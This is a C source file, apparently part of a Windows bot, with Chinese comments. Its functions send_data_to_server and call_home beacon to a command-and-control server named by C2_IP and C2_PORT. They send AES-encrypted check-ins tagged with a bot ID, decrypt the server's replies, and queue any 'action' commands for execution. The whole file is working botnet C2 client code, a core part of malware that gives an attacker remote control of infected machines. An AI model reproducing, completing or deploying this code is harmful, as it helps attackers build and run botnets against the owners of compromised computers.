#include "bot.h"


// 添加 get_content_length 函数实现
int get_content_length(const char *headers) {
    const char *content_length_str = "Content-Length:";
    const char *ptr = headers;
    
    while (*ptr) {
        // 查找 Content-Length 头部
        if (strnicmp(ptr, content_length_str, strlen(content_length_str)) == 0) {
            ptr += strlen(content_length_str);
            
            // 跳过空白字符
            while (*ptr && (*ptr == ' ' || *ptr == '\t')) ptr++;
            
            // 解析长度值
            int length = 0;
            while (*ptr && *ptr >= '0' && *ptr <= '9') {
                length = length * 10 + (*ptr - '0');
                ptr++;
            }
            
            return length;
        }
        
        // 移动到下一行
        while (*ptr && *ptr != '\r' && *ptr != '\n') ptr++;
        while (*ptr == '\r' || *ptr == '\n') ptr++;
    }
    return -1;  // 未找到 Content-Length
}


int send_data_to_server(const char *host, int port, const char *data) {
    SOCKET sock = INVALID_SOCKET;
    uint8_t *encrypted = NULL;
    char *response_body = NULL;
    uint8_t *decrypted = NULL;
    json_t *root = NULL;

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        #ifdef DEBUG_MODE
        printf("[ERROR] socket creation failed: %d\n", WSAGetLastError());
        #endif
        goto cleanup;
    }
    
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    if (inet_pton(AF_INET, host, &server.sin_addr) != 1) {
        #ifdef DEBUG_MODE
        printf("[ERROR] Invalid IP address: %s\n", host);
        #endif
        goto cleanup;
    }
    
    if (connect(sock, (SOCKADDR*)&server, sizeof(server)) == SOCKET_ERROR) {
        #ifdef DEBUG_MODE
        printf("[ERROR] connect failed: %d\n", WSAGetLastError());
        #endif
        goto cleanup;
    }
    
    size_t plaintext_len = strlen(data);
    size_t encrypted_len = plaintext_len + 16;
    encrypted = (uint8_t*)malloc(encrypted_len);
    if (!encrypted) {
        #ifdef DEBUG_MODE
        printf("[ERROR] Memory allocation failed for encryption\n");
        #endif
        goto cleanup;
    }
    
    aes_encrypt_padded((uint8_t*)data, encrypted, &encrypted_len, (uint8_t*)AES_KEY);
    
    char header[1024];
    int header_len = snprintf(header, sizeof(header),
        "POST %s HTTP/1.1\r\n"
        "Host: %s:%d\r\n"
        "User-Agent: %s\r\n"
        "X-Bot-ID: %s\r\n"
        "Content-Type: application/octet-stream\r\n"
        "Content-Length: %zu\r\n"
        "Connection: close\r\n\r\n",
        API_ENDPOINT, host, port, USER_AGENT, bot_id, encrypted_len);
    
    if (send_all(sock, header, header_len) < 0) {
        #ifdef DEBUG_MODE
        printf("[ERROR] Failed to send HTTP headers: %d\n", WSAGetLastError());
        #endif
        goto cleanup;
    }
    
    if (send_all(sock, (char*)encrypted, encrypted_len) < 0) {
        #ifdef DEBUG_MODE
        printf("[ERROR] Failed to send encrypted data: %d\n", WSAGetLastError());
        #endif
        goto cleanup;
    }
    
    char headers[2048];
    size_t recv_header_len = 0;
    if (recv_http_headers(sock, headers, sizeof(headers), &recv_header_len) != 0) {
        #ifdef DEBUG_MODE
        printf("[ERROR] Failed to receive HTTP headers\n");
        #endif
        goto cleanup;
    }
    headers[recv_header_len] = '\0';
    
    #ifdef DEBUG_MODE
    printf("[DEBUG] Received headers:\n%.*s\n", (int)recv_header_len, headers);
    #endif
    
    int content_length = get_content_length(headers);
    #ifdef DEBUG_MODE
    printf("[DEBUG] Content-Length: %d\n", content_length);
    #endif
    
    if (content_length <= 0 || content_length > MAX_RESPONSE) {
        #ifdef DEBUG_MODE
        printf("[WARN] Invalid content length: %d\n", content_length);
        #endif
        goto cleanup;
    }
    
    response_body = (char*)malloc(content_length + 1);
    if (!response_body) {
        #ifdef DEBUG_MODE
        printf("[ERROR] Memory allocation failed for response body\n");
        #endif
        goto cleanup;
    }
    
    if (recv_all(sock, response_body, content_length) != content_length) {
        #ifdef DEBUG_MODE
        printf("[ERROR] Failed to receive full response body. Expected %d, received less\n", content_length);
        #endif
        goto cleanup;
    }
    response_body[content_length] = '\0';
    
    size_t decrypted_len = content_length;
    decrypted = (uint8_t*)malloc(decrypted_len + 1);
    if (!decrypted) {
        #ifdef DEBUG_MODE
        printf("[ERROR] Memory allocation failed for decryption\n");
        #endif
        goto cleanup;
    }
    
    aes_decrypt_padded((uint8_t*)response_body, decrypted, &decrypted_len, (uint8_t*)AES_KEY);
    
    if (decrypted_len == 0) {
        #ifdef DEBUG_MODE
        printf("[ERROR] Decryption failed. Possible reasons:\n"
               "1. Incorrect AES key\n"
               "2. Corrupted data\n"
               "3. Padding error\n");
        hex_dump(response_body, content_length > 64 ? 64 : content_length);
        #endif
        goto cleanup;
    }
    decrypted[decrypted_len] = '\0';
    
    #ifdef DEBUG_MODE
    printf("[+] Received server response (decrypted): ");
    safe_print((char*)decrypted);
    printf("\n");
    #endif
    
    json_error_t error;
    // 必须正确解析JSON响应
    root = json_loads((char*)decrypted, 0, &error); 
    if (root) {
        // 检查响应是否包含命令(action字段)
        json_t *action = json_object_get(root, "action");
        if (action) {
            #ifdef DEBUG_MODE
            printf("[INFO] Command received, caching for execution\n");
            #endif
            // 将命令存入缓存队列
            cache_command((char*)decrypted);
        } else {
            #ifdef DEBUG_MODE
            printf("[INFO] Non-command response received\n");
            #endif
        }
    } else {
        #ifdef DEBUG_MODE
        printf("[WARN] Invalid JSON response: %s\n", error.text);
        printf("Raw response: ");
        safe_print((char*)decrypted);
        printf("\n");
        #endif
    }

cleanup:
    // 确保socket正确关闭
    if (sock != INVALID_SOCKET) {
        shutdown(sock, SD_BOTH);  // 首先关闭双向通信
        closesocket(sock);
        sock = INVALID_SOCKET;    // 重置状态
    }
    free(encrypted);
    free(response_body);
    free(decrypted);
    if (root) {
        json_decref(root);
    }
    return 0;
}

void call_home(int* success_flag) {
    #ifdef DEBUG_MODE
    // 新增入口时间戳日志
    time_t entry_time = time(NULL);
    printf("[CALL_HOME_ENTRY] Attempting connection at %ld\n", entry_time);
    
    printf("[DEBUG][CALL_HOME] Starting call_home function\n");
    printf("[DEBUG][CALL_HOME] Success flag pointer: %p\n", success_flag);
    #endif
    
    SOCKET sock = INVALID_SOCKET;
    uint8_t encrypted[128] = {0};  // 栈上分配，避免内存泄漏
    char *response_body = NULL;
    uint8_t *decrypted = NULL;
    json_t *root = NULL;

    // 初始化成功标志
    if (success_flag) {
        *success_flag = 0;
        #ifdef DEBUG_MODE
        printf("[DEBUG][CALL_HOME] Success flag initialized to 0\n");
        #endif
    } else {
        #ifdef DEBUG_MODE
        printf("[WARN][CALL_HOME] Success flag pointer is NULL\n");
        #endif
    }

    // 创建socket
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        #ifdef DEBUG_MODE
        printf("[ERROR][CALL_HOME] socket creation failed: %d\n", WSAGetLastError());
        #endif
        goto cleanup;
    }
    
    /******************** 新增超时设置 ********************/
    DWORD timeout = 10000; // 10秒超时
    if (setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout)) == SOCKET_ERROR) {
        #ifdef DEBUG_MODE
        printf("[WARN][CALL_HOME] Failed to set receive timeout: %d\n", WSAGetLastError());
        #endif
    }
    
    if (setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout, sizeof(timeout)) == SOCKET_ERROR) {
        #ifdef DEBUG_MODE
        printf("[WARN][CALL_HOME] Failed to set send timeout: %d\n", WSAGetLastError());
        #endif
    }
    /*****************************************************/
    
    #ifdef DEBUG_MODE
    printf("[DEBUG][CALL_HOME] Socket created: %lld\n", (long long)sock);
    #endif
    
    // 设置服务器地址
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(C2_PORT);
    
    #ifdef DEBUG_MODE
    printf("[DEBUG][CALL_HOME] Connecting to %s:%d\n", C2_IP, C2_PORT);
    #endif
    
    // 解析IP地址
    if (inet_pton(AF_INET, C2_IP, &server.sin_addr) != 1) {
        #ifdef DEBUG_MODE
        printf("[ERROR][CALL_HOME] Invalid C2 IP: %s\n", C2_IP);
        #endif
        goto cleanup;
    }
    
    // 连接到服务器
    #ifdef DEBUG_MODE
    time_t connect_start = time(NULL);
    #endif
    if (connect(sock, (SOCKADDR*)&server, sizeof(server)) == SOCKET_ERROR) {
        #ifdef DEBUG_MODE
        printf("[ERROR][CALL_HOME] connect failed: %d\n", WSAGetLastError());
        #endif
        goto cleanup;
    }
    #ifdef DEBUG_MODE
    printf("[TIMING] Connect duration: %lds\n", time(NULL) - connect_start);
    #endif
    
    #ifdef DEBUG_MODE
    printf("[DEBUG][CALL_HOME] Connected to server\n");
    #endif
    
    // 准备请求数据
    char plaintext[128];
    int plaintext_len = snprintf(plaintext, sizeof(plaintext), "{\"bot_id\":\"%s\"}", bot_id);
    
    #ifdef DEBUG_MODE
    printf("[DEBUG][CALL_HOME] Plaintext request: %s\n", plaintext);
    #endif
    
    // 加密数据
    size_t encrypted_len = sizeof(encrypted);
    aes_encrypt_padded((uint8_t*)plaintext, encrypted, &encrypted_len, (uint8_t*)AES_KEY);
    
    #ifdef DEBUG_MODE
    printf("[DEBUG][CALL_HOME] Encrypted data length: %zu\n", encrypted_len);
    #endif
    
    // 准备HTTP请求
    char request[1024];
    int request_len = snprintf(request, sizeof(request),
        "POST %s HTTP/1.1\r\n"
        "Host: %s:%d\r\n"
        "User-Agent: %s\r\n"
        "X-Bot-ID: %s\r\n"
        "Content-Type: application/octet-stream\r\n"
        "Content-Length: %zu\r\n"
        "Connection: close\r\n\r\n",
        API_ENDPOINT, C2_IP, C2_PORT, USER_AGENT, bot_id, encrypted_len);
    
    #ifdef DEBUG_MODE
    printf("[DEBUG][CALL_HOME] HTTP request header:\n%s", request);
    #endif
    
    // 发送HTTP头部
    #ifdef DEBUG_MODE
    time_t send_start = time(NULL);
    #endif
    if (send_all(sock, request, request_len) < 0) {
        #ifdef DEBUG_MODE
        printf("[ERROR][CALL_HOME] Failed to send HTTP headers: %d\n", WSAGetLastError());
        #endif
        goto cleanup;
    }
    
    #ifdef DEBUG_MODE
    printf("[TIMING] Send headers duration: %lds\n", time(NULL) - send_start);
    #endif
    #ifdef DEBUG_MODE
    printf("[DEBUG][CALL_HOME] Sent HTTP headers\n");
    #endif
    
    // 发送加密数据
    #ifdef DEBUG_MODE
    time_t send_data_start = time(NULL);
    #endif
    if (send_all(sock, (char*)encrypted, encrypted_len) < 0) {
        #ifdef DEBUG_MODE
        printf("[ERROR][CALL_HOME] Failed to send encrypted data: %d\n", WSAGetLastError());
        #endif
        goto cleanup;
    }
    #ifdef DEBUG_MODE
    printf("[TIMING] Send data duration: %lds\n", time(NULL) - send_data_start);
    #endif
    
    #ifdef DEBUG_MODE
    printf("[DEBUG][CALL_HOME] Sent encrypted data\n");
    #endif
    
    // 接收HTTP头部
    char headers[2048];
    size_t header_len = 0;
    #ifdef DEBUG_MODE
    time_t recv_header_start = time(NULL);
    #endif
    
    int recv_result = recv_http_headers(sock, headers, sizeof(headers), &header_len);
    
    #ifdef DEBUG_MODE
    printf("[TIMING] Recv headers duration: %lds\n", time(NULL) - recv_header_start);
    #endif
    #ifdef DEBUG_MODE
    printf("[DEBUG][CALL_HOME] recv_http_headers returned: %d\n", recv_result);
    #endif
    
    if (recv_result != 0) {
        #ifdef DEBUG_MODE
        printf("[ERROR][CALL_HOME] Failed to receive HTTP headers\n");
        #endif
        goto cleanup;
    }
    headers[header_len] = '\0';
    
    #ifdef DEBUG_MODE
    printf("[DEBUG][CALL_HOME] Received headers:\n%.*s\n", (int)header_len, headers);
    #endif
    
    // 获取内容长度
    int content_length = get_content_length(headers);
    #ifdef DEBUG_MODE
    printf("[DEBUG][CALL_HOME] Content-Length: %d\n", content_length);
    #endif
    
    // 验证内容长度
    if (content_length <= 0 || content_length > MAX_RESPONSE) {
        #ifdef DEBUG_MODE
        printf("[WARN][CALL_HOME] Invalid content length: %d\n", content_length);
        #endif
        goto cleanup;
    }
    
    // 分配内存存储响应体
    response_body = (char*)malloc(content_length + 1);
    if (!response_body) {
        #ifdef DEBUG_MODE
        printf("[ERROR][CALL_HOME] Memory allocation failed for response body\n");
        #endif
        goto cleanup;
    }
    
    #ifdef DEBUG_MODE
    printf("[DEBUG][CALL_HOME] Allocated %d bytes for response body\n", content_length + 1);
    #endif
    
    // 接收响应体
    #ifdef DEBUG_MODE
    time_t recv_body_start = time(NULL);
    #endif
    int recv_bytes = recv_all(sock, response_body, content_length);
    if (recv_bytes != content_length) {
        #ifdef DEBUG_MODE
        printf("[ERROR][CALL_HOME] Failed to receive full response body. Expected %d, received %d\n", 
               content_length, recv_bytes);
        #endif
        goto cleanup;
    }
    #ifdef DEBUG_MODE
    printf("[TIMING] Recv body duration: %lds\n", time(NULL) - recv_body_start);
    #endif
    response_body[content_length] = '\0';
    
    #ifdef DEBUG_MODE
    printf("[DEBUG][CALL_HOME] Received %d bytes response body\n", recv_bytes);
    #endif
    
    // 解密响应
    size_t decrypted_len = content_length;
    decrypted = (uint8_t*)malloc(decrypted_len + 1);
    if (!decrypted) {
        #ifdef DEBUG_MODE
        printf("[ERROR][CALL_HOME] Memory allocation failed for decryption\n");
        #endif
        goto cleanup;
    }
    
    #ifdef DEBUG_MODE
    printf("[DEBUG][CALL_HOME] Decrypting response...\n");
    time_t decrypt_start = time(NULL);
    #endif
    
    aes_decrypt_padded((uint8_t*)response_body, decrypted, &decrypted_len, (uint8_t*)AES_KEY);
    
    #ifdef DEBUG_MODE
    printf("[TIMING] Decrypt duration: %lds\n", time(NULL) - decrypt_start);
    #endif
    
    // 检查解密是否成功
    if (decrypted_len == 0) {
        #ifdef DEBUG_MODE
        printf("[ERROR][CALL_HOME] Decryption failed. Possible reasons:\n"
               "1. Incorrect AES key\n"
               "2. Corrupted data\n"
               "3. Padding error\n");
        hex_dump(response_body, content_length > 64 ? 64 : content_length);
        #endif
        goto cleanup;
    }
    decrypted[decrypted_len] = '\0';
    
    #ifdef DEBUG_MODE
    printf("[DEBUG][CALL_HOME] Decrypted data length: %zu\n", decrypted_len);
    printf("[DEBUG][CALL_HOME] Decrypted response: ");
    safe_print((char*)decrypted);
    printf("\n");
    #endif
    
    // 解析JSON响应
    json_error_t error;
    root = json_loads((char*)decrypted, 0, &error);
    if (root) {
        #ifdef DEBUG_MODE
        printf("[DEBUG][CALL_HOME] JSON parsed successfully\n");
        #endif
        
        // 检查响应中是否有命令
        json_t *action = json_object_get(root, "action");
        if (action) {
            #ifdef DEBUG_MODE
            printf("[INFO][CALL_HOME] Command received, caching for execution\n");
            #endif
            // 缓存命令
            cache_command((char*)decrypted);
        } else {
            #ifdef DEBUG_MODE
            printf("[INFO][CALL_HOME] Non-command response received\n");
            #endif
        }
        
        // 设置成功标志
        if (success_flag) {
            *success_flag = 1;
            #ifdef DEBUG_MODE
            printf("[DEBUG][CALL_HOME] Setting success flag to 1\n");
            #endif
        }
    } else {
        #ifdef DEBUG_MODE
        printf("[WARN][CALL_HOME] Invalid JSON response: %s\n", error.text);
        printf("[WARN][CALL_HOME] Raw response: ");
        safe_print((char*)decrypted);
        printf("\n");
        #endif
    }

    cleanup:
        #ifdef DEBUG_MODE
        // 新增出口时间戳日志
        time_t exit_time = time(NULL);
        printf("[CALL_HOME_EXIT] Finished at %ld | Duration: %lds\n", 
               exit_time, exit_time - entry_time);
        #endif
        
        // 清理资源
        if (sock != INVALID_SOCKET) {
            #ifdef DEBUG_MODE
            printf("[DEBUG][CALL_HOME] Closing socket %lld\n", (long long)sock);
            #endif
            closesocket(sock);
        }
        
        if (response_body) {
            #ifdef DEBUG_MODE
            printf("[DEBUG][CALL_HOME] Freeing response body\n");
            #endif
            free(response_body);
        }
        
        if (decrypted) {
            #ifdef DEBUG_MODE
            printf("[DEBUG][CALL_HOME] Freeing decrypted data\n");
            #endif
            free(decrypted);
        }
        
        if (root) {
            #ifdef DEBUG_MODE
            printf("[DEBUG][CALL_HOME] Freeing JSON root\n");
            #endif
            json_decref(root);
        }
        
        #ifdef DEBUG_MODE
        if (success_flag && *success_flag) {
            printf("[DEBUG][CALL_HOME] Communication successful\n");
        } else {
            printf("[DEBUG][CALL_HOME] Communication failed\n");
        }
        printf("[DEBUG][CALL_HOME] Exiting call_home function\n");
        #endif
}